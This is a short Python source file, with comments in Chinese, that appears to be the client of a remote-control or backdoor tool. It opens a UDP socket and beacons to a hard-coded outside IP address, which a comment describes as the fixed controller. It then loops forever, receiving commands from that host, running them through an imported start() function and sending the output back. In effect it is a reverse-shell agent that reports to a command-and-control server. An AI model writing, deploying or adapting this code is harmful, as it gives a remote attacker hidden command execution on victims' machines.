# -*- coding:UTF-8 -*-
import socket
from gevent import monkey
import gevent
from client_plug_in import *
import time
monkey.patch_all()
class Client_exec(object):
	#客户端初始化连接socket
	def __init__(self):
		self.server=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
		self.server.bind(("", 5555))
		self.ip="47.93.233.107"#这里填写控制端 这基本是固定的
		# self.ip="127.0.0.1"
		self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		while True:
			self.server.sendto("ok".encode(),(self.ip,5555))
			recv=self.server.recvfrom(4096)
			self.port=recv[1][1]
			if recv[0].decode()=='ok':
				break
			time.sleep(5)

	#客户端接收shell
	def recv_shell(self,recv_cmd):
		cmd=recv_cmd[0]
		# self.ip=recv_cmd[1][0]
		ret=start(cmd,self.server,self.ip)#这里是去start函数中处理shell
		self.shell(ret)#返回给服务器端结果
	#客户端放回shell处理结果
	def shell(self,cmd):
		self.server.sendto(cmd.encode("utf-8"), (self.ip, 5555))
	#开始运行
	def run(self):
		# self.server.sendto("HI".encode("utf-8"), ("10.102.23.26", 5555))
		# print("1")
		while True:
			recv_cmd = self.server.recvfrom(1024)
			print(recv_cmd)
			self.recv_shell(recv_cmd)

def main():
	Client=Client_exec()
	Client.run()
if __name__ == '__main__':
	main()